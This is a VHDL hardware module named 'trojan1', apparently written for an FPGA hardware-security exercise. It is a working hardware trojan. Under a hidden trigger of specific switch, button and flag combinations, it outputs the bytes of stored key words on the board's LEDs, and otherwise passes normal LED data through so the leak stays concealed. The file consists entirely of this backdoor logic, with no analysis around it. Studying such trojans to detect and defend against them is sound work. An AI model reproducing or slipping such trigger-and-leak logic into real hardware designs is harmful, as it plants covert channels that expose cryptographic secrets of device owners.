----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date:    14:46:55 02/09/2017 
-- Design Name: 
-- Module Name:    trojan1 - Behavioral 
-- Project Name: 
-- Target Devices: 
-- Tool versions: 
-- Description: 
--
-- Dependencies: 
--
-- Revision: 
-- Revision 0.01 - File Created
-- Additional Comments: 
--
----------------------------------------------------------------------------------
library IEEE;
use IEEE.STD_LOGIC_1164.ALL;
use work.srom.all;
-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
--use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx primitives in this code.
library UNISIM;
use UNISIM.VComponents.all;

entity trojan1 is
port ( kyTr : in STD_LOGIC;
       val, btnl, btnr, out1 : in  STD_LOGIC;
		 sw : in  STD_LOGIC_VECTOR (15 downto 0);
		 inkey : in lArray;
		 inled : in  STD_LOGIC_VECTOR (7 downto 0);
		 led : out  STD_LOGIC_VECTOR (7 downto 0));
		
end trojan1;

architecture Behavioral of trojan1 is

begin

process ( kyTr, val, btnl, btnr, out1, sw, inkey )
begin
	
	if ( kyTr = '1' ) then
			if (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011000100" ) then
			led(7 downto 0) <= inkey (0) (7 downto 0);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011000101" ) then
			led(7 downto 0) <= inkey (0) (15 downto 8);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011000110" ) then
			led(7 downto 0) <= inkey (0) (23 downto 16);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011000111" ) then
			led(7 downto 0) <= inkey (0) (31 downto 24);
			
			elsif (val = '1' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000100" ) then
			led(7 downto 0) <= inkey (1) (7 downto 0);
			elsif (val = '1' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000101" ) then
			led(7 downto 0) <= inkey (1) (15 downto 8);
			elsif (val = '1' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000110" ) then
			led(7 downto 0) <= inkey (1) (23 downto 16);
			elsif (val = '1' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000111" ) then
			led(7 downto 0) <= inkey (1) (31 downto 24);
			
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000100" ) then
			led(7 downto 0) <= inkey (2) (7 downto 0);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000101" ) then
			led(7 downto 0) <= inkey (2) (15 downto 8);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000110" ) then
			led(7 downto 0) <= inkey (2) (23 downto 16);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '0' and sw = "1111000011000111" ) then
			led(7 downto 0) <= inkey (2) (31 downto 24);
			
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011100100" ) then
			led(7 downto 0) <= inkey (3) (7 downto 0);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011100101" ) then
			led(7 downto 0) <= inkey (3) (15 downto 8);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011100110" ) then
			led(7 downto 0) <= inkey (3) (23 downto 16);
			elsif (val = '0' and btnl = '1' and btnr = '1' and out1 = '1' and sw = "1111000011100111" ) then
			led(7 downto 0) <= inkey (3) (31 downto 24);
			else 
			led(7 downto 0) <= inled (7 downto 0);
			end if;
		else 
		led(7 downto 0) <= inled (7 downto 0);
		end if;
			
	
	
	
end process;


end Behavioral;

